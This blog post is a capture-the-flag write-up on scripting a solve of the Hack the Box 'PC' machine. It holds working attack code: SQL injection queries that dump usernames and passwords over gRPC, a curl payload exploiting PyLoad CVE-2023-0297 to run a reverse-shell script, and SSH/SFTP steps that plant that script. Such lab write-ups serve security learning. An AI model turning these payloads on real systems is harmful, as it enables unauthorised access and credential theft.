---
title: "Hack the Box — PC, but automated"
date: 2023-11-06T20:05:09-08:00
draft: false
toc: true
images:
tags:
  - htb
  - automation
---
PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.

_Note 1: This is not a proper write-up of the PC box. There is already an official write-up by the creator of the box which is very thorough and explains all the details of the box. There are many unofficial writeups as well. There’s also ippsec’s video on his channel._

_Note 2: This script only automates the steps that need to be taken to get the flags. It does not automate the looking for the vulnerabilities part. After I completed the box, I automated the steps I took to get the flags._

The complete code for this script can be found on [Github](https://github.com/anuraagbaishya/htb-pc).

## Setup grpc
The box is running a grpc service on port 50051. Therefore, to interact with the service, we need a grpc client. I followed a [tutorial](https://grpc.io/docs/languages/python/basics/) on how to create a grpc client using thegrpcio-tools Python library. The first step was to define the service in a .proto file. My service definition is here. Once the service is defined grpcio-tools can generate the client code for you. You can use a command like this:
```bash
$ python -m grpc_tools.protoc -I../../protos --python_out=. --pyi_out=. --grpc_python_out=. SimpleApp.proto
```

For me, this generated 2 additional files, [`SimpleApp_pb2.py`](https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2.py) and [`SimpleApp_pb2_grpc.py`](https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2_grpc.py) . I will not explain what these files do here, since that itself is a lengthy topic of discussion. If you are curious, the tutorial link I added earlier has a lot of resources to understand grpc and how it works.

Once we have the required files generated, we can connect to the grpc service:
```python
def _setup_grpc(self):
    channel = grpc.insecure_channel(f"{self.host}:{self.grpc_port}")
    stub = pb2_grpc.SimpleAppStub(channel)

    return stub
```
Here `pb2_grpc` contains the client and server classes corresponding to protobuf-defined grpc services.

## SQL Injection in grpc
The grpc service exposes a `getInfoRequest` which takes an id parameter. It then uses the id to make an SQL query. The id parameter is vulnerable to SQL injection. We can exploit it by making a query like:

```python
query = "62 UNION SELECT name FROM sqlite_master where type='table'"
pb2.getInfoRequest(id=query) 
```

Here `pb2` is the protobuf client we will use to interact with the grpc service. The above request will get the tables from `sqlite_master`.


This does not work out of the box, however. It requires an admin token to be sent as metadata. We can obtain the token by sending a `LoginUserRequest`. The username/password is conveniently set to admin/admin.

```python
def _get_token(self):
    user = pb2.LoginUserRequest(username="admin", password="admin")
    _, call = self.stub.LoginUser.with_call(user)
    metadata = call.trailing_metadata()
    token = metadata[0].value[2:-1]

    return token
```

Once I had the token, I could make the `getInfoRequest` request and get the user details. To get the user details, I first got the table name, then the columns in the table, and finally queried all the columns of the table.

```python
def _get_users(self) -> dict:
    print("Getting users")

    query = "62 UNION SELECT name FROM sqlite_master where type='table'"
    table = self._sql_injection_request(query)

    query = f"62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info('{table}')"
    cols = self._sql_injection_request(query)

    res = []
    for col in cols.split(","):
        query = f"62 UNION SELECT GROUP_CONCAT({col}) FROM {table}"
        r = self._sql_injection_request(query)
        res.append(r.split(","))

    usernames = res[0]
    passwords = res[1]

    users = []
    for i in range(len(usernames)):
        users.append({"username": usernames[i], "password": passwords[i]})

    print("Users found")
    print(json.dumps(users))

    return users
```

The `_sql_injection_request` function is defined as:

```python
def _sql_injection_request(self, query):
    metadata = (("token", self.token),)
    id_request = pb2.getInfoRequest(id=query)
    r = self.stub.getInfo.with_call(id_request, metadata=metadata)
    return r[0].message
```

## Getting user flag
The user list has a user `sau` , who has SSH access to the machine. The next step is to start an SSH session and read the user flag stored at `/home/sau/user.txt`. This is quite straightforward. I created a simple SSH Client using the `paramiko` library and executed `cat /home/sau/user.txt`:

```python
def exec_command(self, command):
    ssh_stdin, ssh_stdout, ssh_stderr = self.client.exec_command(command)
    return ssh_stdout.read().decode("utf-8")
```

## PyLoad CVE
PyLoad is an open-source download manager. PyLoad versions prior to 0.5.0b3.dev31 are vulnerable to pre-auth RCE (CVE-2023–0297). There are many available exploits for this vulnerability. You can read more about the vulnerability and the exploit [here](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad).

The vulnerability allows us to execute a payload like this:

```bash
curl -i -s -k -X $'POST' \
--data-binary
$'jk=pyimport%20os;os.system(\"bash%20/home/sau/shell.sh\");f=function%20f2()
{};&package=xxx&crypted=AAAA&&passwords=aaaa' \
$'http://localhost:8000/flash/addcrypted2'
```

Here, I am running a script called [`shell.sh`](https://github.com/anuraagbaishya/htb-pc/blob/main/shell.sh) which is just a bash reverse shell.

PyLoad on this box is not available publicly. It can only be accessed from within the box. The official write-up uses SSH tunneling to tunnel from the user’s machine to the box. I chose the alternative option of running the exploit from within the SSH session, using the same `exec_command` function I used to read the user flag.

I used SFTP to transfer the reverse shell to the box:

```python
def transfer_file_from_local(self):
    ftp_client = self.client.open_sftp()
    ftp_client.put("shell.sh", "/home/sau/shell.sh")
```

The last step is to start a reverse shell listener and then read the root flag from within the reverse shell session. For this, I created a simple [socket client](https://github.com/anuraagbaishya/htb-pc/blob/main/revsh.py) which listens for a connection and then performs `cat /root/root.txt`.

I ran both the exploitation script and the socket client as two separate processes using a shell script:

```bash
#! /bin/bash

python auto_exploit.py &
python revsh.py
```

It might (should) be possible to run the exploitation part and socket listener as separate threads of the same process. I tried for a bit, but it didn’t work and I just chose the easy way out.

Running the runner script, I got both the user and root flags:

![Flags](/flags.webp)


## Closing Thoughts
This experiment was a lot of fun. After completing this box, I pondered over what makes a box scriptable. I think the correct answer is — all boxes are scriptable if one is willing to persevere. The more practical questions what makes a box easy to script. I have come up with these criteria:

* Requires little to no UI interaction like clicking buttons, filing forms, etc that cannot be replicated using direct web / API calls. It might be possible to replicate these functionalities using selenium or similar — but that increases the complexity of the script.
* Related to the above — requires performing operations using some software running on one of the open ports or the machine. These might be web UIs or even CLI programs installed in the box.
* Has a lot of steps / requires running a lot of tools. The time required to create the script will be directly proportionate to the number of steps.

This was the first (and only) box I have tried to script. I have done a few other boxes after this one, but I did not spend time trying to script them because of one of the above reasons. As I complete more boxes, I will continue to assess if the box is easy to script. If yes, great! If not, it may have to do with one of the above reasons, or I might have some other new reasons.

That’s it from me. This is my 2023 contribution to my blog. I will not promise anything else here till a really long time has passed since this publication. I usually don’t work on technical things during my free time. Most (if not all) of the security work I do is by virtue of my employment. Therefore, there usually is not much for me to share.

Thanks for reading!
